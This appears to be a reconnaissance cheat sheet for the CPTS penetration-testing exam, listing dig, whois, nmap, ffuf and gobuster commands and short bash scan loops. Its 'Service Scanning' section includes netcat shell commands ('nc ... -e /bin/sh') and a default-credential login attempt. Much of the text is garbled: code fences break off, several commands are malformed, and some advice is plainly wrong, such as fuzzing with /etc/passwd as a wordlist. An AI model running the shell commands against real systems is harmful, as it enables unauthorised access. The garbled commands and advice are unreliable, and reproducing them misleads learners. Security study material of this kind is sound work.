# CPTS 02: Reconnaissance Playbook

## Quick Intro
Passive reconnaissance gathers info without touching the target. Active probing triggers responses. CPTS requires you to chain these efficiently. Use `{target}` consistently.

## Attack Workflow

1. **Passive Info Gathering**: DNS, Host, Social.
2. **Active Port Scanning**: Identify open ports/services.
3. **Service Enumeration**: Version/OS detection.
4. **Web/App Fuzzing**: Directory and param testing.
5. **Active Recon**: Verify live hosts.

---

## Commands Section

### DNS & OSINT
```bash
dig ANY {target}
whois {target}
theHarvester -d {target} -b mail -o -
shodan q {target} | grep Port | head -50
```nmap -v -p- {target}

### Port Scanning
```bash
nmap -sC -sV -O -T4 -A {target}
nmap --script vuln {target}

# Specific Services
curl -v http://{target}/admin | grep Server | tail -n 1
```nmap -sV {target} --top-ports 1000

### Directory Fuzzing
```bash
ffuf -w words.txt -u http://{target}/FFUFU {target}/FFUFU/FFU
ffuf -U -w -U -u http://{target}/admin/{target}

# Common paths
ffuf -u http://{target}/ -w /etc/passwd
```gobuster dir -u http://{target} -w words.txt
gobuster dir -u http://{target} -u http://admin/

### Service Scanning
```bash
curl -s -L http://{target}/admin/ -u admin:admin
nc {target} -e /bin/sh

# Netcat Interactive
nc -e /bin/sh {target} 8080
nc {target} -e /bin/bash -p 443
```gobuster dir -u http://{target} -w wordlist.txt

---

## Tips & Shortcuts

*   **Speed**: Use `-A` flag with nmap for NSE scripts.
*   **Port Speed**: Use `-T4` with `-T5` only if target is responsive.
*   **Passive**: Use `theHarvester`, `Maltego`, `SpiderFoot`.
*   **Active**: Use `ffuf` with `FFUFU` for path enumeration.
*   **Port Scanning**: Use `-sV` for service version.
*   **DNS**: Use `dig` for reverse lookup.
*   **Web**: Use `curl -v` for headers.

---

## Common Mistakes

*   **Skipping Passive**: Always check DNS first before scanning.
*   **Bad Ports**: Don't scan all ports without reason.
*   **Ignoring NSE**: Nmap Script Engine can find vulnerabilities.
*   **No Output**: Always capture `nmap` results to files.
*   **Target IP**: Don't forget to use `{target}` in all commands.

---

## Mini Automation Scripts

### Script 1: Basic Port Scan
```bash
#!/bin/bash
for port in 80 443 8080 21 22 25; do
    nmap -p $port {target}
done
```

### Script 2: Fuzzy Directory
```bash
#!/bin/bash
for dir in /admin /wp /phpmyadmin /cgi-bin; do
    ffuf -u http://{target}${dir} -w wordlist.txt
done
```

### Script 3: DNS Enumeration
```bash
#!/bin/bash
dig {target}.any.any
```nslookup {target}

## Final Checklist

1. Pass `nmap -sC -sV -A {target}`.
2. Use `ffuf` for directories.
3. Capture `DNS Records`.
4. Check `HTTP Headers`.
5. Save all outputs to `recon-{target}.txt`.
